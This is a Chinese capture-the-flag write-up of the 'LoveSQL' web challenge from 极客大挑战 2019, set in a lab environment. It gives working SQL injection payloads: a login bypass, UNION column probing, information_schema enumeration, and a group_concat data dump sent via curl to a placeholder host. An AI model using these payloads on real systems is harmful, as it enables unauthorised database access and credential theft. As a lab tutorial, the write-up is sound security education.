---
title: 极客大挑战 2019 - Web - LoveSQL
date: 2026-11-14 18:32:00
categories:
  - CTF
  - 极客大挑战 2019
  - Web
tags:
  - SQL 注入
  - UNION 联合查询
  - information_schema
  - 数据回显
cover: /img/cover/rainy-night-white-hair-girl.jpg
description: 极客大挑战 2019 的 UNION 注入题，登录接口拼接 GET 参数且成功后回显用户名与密码，可把联合查询结果打到这两处。依次探测列数、库名、表名与列名，最后从 l0ve1ysq1 表读出藏在 password 字段的 flag。
keywords:
  - SQL 注入
  - UNION 注入
  - 回显位
  - information_schema
  - LoveSQL
ai: >-
  本题是极客大挑战 2019 的 Web 题 LoveSQL，是 EasySQL 的进阶版，考察完整的 UNION 联合查询注入流程。登录接口 check.php 通过 GET 参数拼接 SQL 且未过滤，万能密码登录后页面会把用户名与密码回显出来，正好提供两个可见回显位。利用时先用 order by 风格的联合查询确定查询为三列，并确认第二列回显到问候语、第三列回显到密码处；随后依次注入 database 函数得到库名，再查 information_schema 枚举出表与列，最终定位到存放 flag 的数据表。读取时把多列用连接函数聚合成一行打到回显位，从密码列里取到 flag。相比万能密码题，本题要求选手掌握列数探测、回显位确认与元数据查询的完整套路。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 极客大挑战 2019 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

首页表单：

```html
<form action="check.php" method="GET">
```

参数 `username`、`password`。登录成功后页面回显用户名（`Hello X`）和密码（`Your password is 'X'`），这两处可作为 UNION 注入的回显位。

练习场 ID、题目 ID、friendly_id 与提交记录 ID 等标识已脱敏。

## 漏洞分析

类型：SQL 注入（UNION 联合查询注入）。

原理：登录接口 `check.php` 通过 GET 参数 `username`、`password` 拼接 SQL 查询，未做过滤。登录成功后页面回显用户名和密码，可用 UNION 注入将查询结果回显到这两处。

## 利用过程

1. **定位注入点**：首页表单 `<form action="check.php" method="GET">`，参数 `username`、`password`。
2. **万能密码测试**：`password=' or 1=1#` 登录成功，回显 `Hello admin`、密码 `29e39d8e4b16100b1244c958397aa473`（非 flag）。
3. **确定列数与回显位置**：`' union select 1,2,3#` 确定查询为 3 列，第 2 列回显在 `Hello X`，第 3 列回显在 `Your password is 'X'`。
4. **查库名**：`' union select 1,database(),3#` → `geek`。
5. **查表名**：`information_schema.tables` → `geekuser`、`l0ve1ysq1`。
6. **查列名**：`l0ve1ysq1` 表列 `id,username,password`。
7. **读 flag**：`select group_concat(id,0x7c,username,0x7c,password) from geek.l0ve1ysq1`，第 16 行：

```text
16|flag|flag{xxxx}
```

## 完整 EXP

payload 归档内容并入本节。最终 payload（URL 编码前）：

```http
GET /check.php?username=1&password=' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from geek.l0ve1ysq1),3# HTTP/1.1
Host: target:8080
```

curl 命令（URL 编码后）：

```bash
curl "http://target:8080/check.php?username=1&password=%27%20union%20select%201%2C(select%20group_concat(id%2C0x7c%2Cusername%2C0x7c%2Cpassword)%20from%20geek.l0ve1ysq1)%2C3%23"
```

关键步骤：

1. 万能密码：`password=' or 1=1#`
2. 列数探测：`' union select 1,2,3#`（3 列，第 2 列回显 Hello，第 3 列回显 password）
3. 库名：`' union select 1,database(),3#` → `geek`
4. 表名：`geekuser`、`l0ve1ysq1`
5. flag 在 `l0ve1ysq1` 表第 16 行 password 列

## Flag

```text
flag{xxxx}
```

提交记录：结果 accepted，+1 分（真实 flag 与提交 ID 已脱敏）。

## 踩坑与总结

- 万能密码登录回显的密码是普通数据而非 flag，需要继续 UNION 注入取数据。
- 先确认列数（3 列）与两个回显位（第 2、3 列），再逐步查库、查表、查列。
- 用 `group_concat` 把多列聚合成一行，配合 `0x7c`（竖线）分隔便于阅读。
- 注意 GET 传参需对引号、空格、`#`、逗号做 URL 编码。
- 平台提交 accepted、+1 分，二次复现稳定。
